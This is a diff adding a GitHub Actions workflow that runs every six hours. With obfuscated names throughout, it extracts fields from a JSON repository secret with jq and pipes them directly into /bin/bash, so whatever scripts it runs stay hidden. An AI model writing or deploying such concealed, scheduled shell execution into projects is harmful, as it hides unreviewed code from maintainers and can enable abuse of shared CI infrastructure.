@@ -1,0 +1,28 @@
+name: wozheyiqiang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wozheyiqiang
+        env:
+          mof042: ${{ secrets.mof042 }}
+        run: |
+          echo $mof042 | jq -r .fhv879 | /bin/bash
+          echo $afm9 | jq -r .nzwdg4841 | /bin/bash
+          echo $pfcx8445 | jq -r .m5 | /bin/bash
+          echo $njf39053 | jq -r .fh15678 | /bin/bash
+          echo $ps27 | jq -r .hdugz63569 | /bin/bash
+          echo $ktu48 | jq -r .tp4519 | /bin/bash
+          echo $kkpz0 | jq -r .j2641 | /bin/bash
+          echo $oi20683 | jq -r .ndwho4205 | /bin/bash
+          echo $mb58 | jq -r .nzwm61474 | /bin/bash
+          echo $n468 | jq -r .wxor55658 | /bin/bash
+          echo $ebnhq5 | jq -r .knez3547 | /bin/bash
+
